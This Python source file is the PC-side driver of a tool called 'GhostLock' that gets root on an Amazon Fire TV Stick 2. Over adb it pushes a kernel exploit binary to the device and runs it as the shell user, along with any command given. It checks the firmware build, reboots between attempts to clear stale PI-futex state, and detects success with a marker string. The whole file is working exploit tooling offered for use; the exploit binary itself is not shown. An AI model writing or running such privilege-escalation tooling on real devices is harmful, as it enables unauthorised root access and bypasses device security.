#!/usr/bin/env python3
"""GhostLock one-shot root CLI for the Fire TV Stick 2 (AFTT, "tank").

    python scripts/gl_root.py --serial <serial> --cmd "id"

The tool is a thin PC-side wrapper around probes/gl_exploit:

* build guard: refuses to run on anything but 288.6.8.8_user_688805020
  (product "tank", kernel 3.10.54+);
* the payload always runs as the unprivileged `shell` user (uid 2000);
* one attempt = one fresh payload process (fresh mm, fresh futex keys);
* a silent failure leaves stale PI-futex state behind, and the next process
  can collide with it (that is what turns a retry into a panic), so every
  retry is preceded by a clean reboot;
* a panic reboots the device by itself; the tool waits for boot and retries;
* success is detected by a marker echoed by the root child, so a silent
  failure never looks like a success.

Exit code: 0 = command ran as root, 1 = all attempts failed, 2 = environment
or build-guard error.
"""

from __future__ import annotations

import argparse
import hashlib
import shlex
import sys
import time
from datetime import datetime
from pathlib import Path

from gl_bench import (
    BIN,
    REPO,
    BenchError,
    Device,
    OUT,
    ensure_dirs,
    pick_serial,
    require_build,
)

PAYLOAD = REPO / "probes" / "gl_exploit"
MARK = "GL_ROOT_OK"


def uptime(dev: Device) -> float:
    try:
        return float(dev.shell("cat /proc/uptime").stdout.split()[0])
    except (ValueError, IndexError, BenchError):
        return 0.0


def shell_ready(dev: Device, timeout: float = 90.0) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            p = dev.shell("echo ready", timeout=10)
            if p.returncode == 0 and "ready" in p.stdout:
                return True
        except BenchError:
            pass
        time.sleep(1)
    return False


def settle(dev: Device, boot_timeout: float, extra: float = 8.0) -> bool:
    """Wait for a booted, responsive shell, then let the system calm down.

    Running the exploit while Android is still starting up measurably lowers
    the first-attempt success rate, so give SurfaceFlinger/mediaserver a
    moment.
    """
    if not dev.booted(timeout=boot_timeout):
        return False
    if not shell_ready(dev):
        return False
    if extra > 0:
        time.sleep(extra)
    return True


def reboot_clean(dev: Device, boot_timeout: float) -> bool:
    try:
        dev.shell("sync", timeout=20)
    except BenchError:
        pass
    try:
        dev.shell("reboot", timeout=10)
    except BenchError:
        pass
    time.sleep(5)
    return settle(dev, boot_timeout)


def run_attempt(dev: Device, remote: str, cmd: str, timeout: float) -> tuple[str, bool]:
    """Run one payload process. Returns (console, device_rebooted)."""
    before = uptime(dev)

    wrapped = f"echo {MARK}; {cmd}; echo GL_DONE:$?"
    argv = f"-c {shlex.quote(wrapped)}"

    timed_out = False
    try:
        p = dev.shell(f"{remote} {argv}", timeout=timeout)
        console = (p.stdout or "") + (p.stderr or "")
    except BenchError as exc:
        timed_out = "timeout" in str(exc)
        console = str(exc) + "\n"
        try:
            dev.su(f"pkill -9 -f {Path(remote).name} || true")
        except BenchError:
            pass

    if timed_out:
        return console, False

    # panic_on_oops=1: a crash drops adb and reboots.
    if not dev.booted(timeout=180):
        pass
    after = uptime(dev)
    rebooted = before > 0 and after > 0 and after + 1.0 < before
    return console, rebooted


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="GhostLock one-shot root (tank)")
    ap.add_argument("--serial", help="adb serial (default: only online device)")
    ap.add_argument("--cmd", default="id", help="command to run as root")
    ap.add_argument("--attempts", type=int, default=3)
    ap.add_argument("--timeout", type=float, default=40.0)
    ap.add_argument("--reboot-wait", type=float, default=240.0)
    ap.add_argument("--no-reboot-between", action="store_true",
                    help="retry without rebooting (faster, but may panic)")
    ap.add_argument("--dry-run", action="store_true", help="only check the build")
    args = ap.parse_args(argv)

    try:
        serial = pick_serial(args.serial)
        dev = Device(serial)
        print(f"device: {serial}")
        values = require_build(dev)
        print(f"build:  {values['incremental']} ({values['device']})")
        print(f"kernel: {values['kernel']}")
        print(f"selinux: {values['selinux']}")
        if args.dry_run:
            print("build guard: OK")
            return 0

        if not PAYLOAD.exists():
            raise BenchError(f"missing payload: {PAYLOAD}")

        data = PAYLOAD.read_bytes()
        digest = hashlib.sha256(data).hexdigest()
        stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        logdir = OUT / f"root-{stamp}"
        logdir.mkdir(parents=True, exist_ok=True)

        # A freshly booted system is busy; let it settle first.
        if uptime(dev) < 30.0:
            print("device just booted; settling ...", end="", flush=True)
            if not settle(dev, args.reboot_wait):
                print(" timeout")
                return 2
            print(" ok")

        ensure_dirs(dev)
        # Keep /data/local/tmp/gl/bin from growing by 12 KB per invocation.
        dev.shell(f"rm -f {BIN}/gl-exploit-* 2>/dev/null")
        remote = f"{BIN}/gl-exploit-{stamp}"
        dev.push(PAYLOAD, remote)
        # adb push does not fsync: without this, a panic right after the push
        # can leave a 0-byte binary on /data (and the retry would exec air).
        dev.shell("sync", timeout=30)
        p = dev.shell(f"ls -l {remote}")
        if str(len(data)) not in p.stdout:
            raise BenchError(f"payload push incomplete: {p.stdout.strip()}")
        dev.shell(f"chmod 755 {remote}")
        print(f"payload: {remote} (sha256 {digest[:16]}...)")

        attempts = max(1, args.attempts)
        for i in range(1, attempts + 1):
            print(f"attempt {i}/{attempts} ...", end="", flush=True)
            t0 = time.time()
            console, rebooted = run_attempt(dev, remote, args.cmd, args.timeout)
            dt = time.time() - t0
            (logdir / f"attempt-{i}.txt").write_text(console, encoding="utf-8", errors="replace")
            ok = MARK in console
            print(f" {'ROOT' if ok else 'fail'} ({dt:.1f}s){' [device rebooted]' if rebooted else ''}")

            if ok:
                body = console.split(MARK, 1)[1]
                if "GL_DONE:" in body:
                    body = body.split("GL_DONE:", 1)[0]
                print("---- command output ----")
                sys.stdout.write(body.strip() + "\n")
                print("------------------------")
                print(f"log: {logdir}")
                return 0

            if i == attempts:
                break

            # A failed attempt leaves PI-futex state pointing at a dead task.
            # Reusing the same kernel with a new process can collide with it,
            # so start each retry from a clean boot.
            if rebooted:
                print("  waiting for boot ...", end="", flush=True)
                if not settle(dev, args.reboot_wait):
                    print(" timeout")
                    break
                print(" ok")
            elif not args.no_reboot_between:
                print("  cleaning up (reboot) ...", end="", flush=True)
                if not reboot_clean(dev, args.reboot_wait):
                    print(" timeout")
                    break
                print(" ok")

        print("all attempts failed; the device was left untouched (no persistent write)")
        print(f"log: {logdir}")
        return 1
    except BenchError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
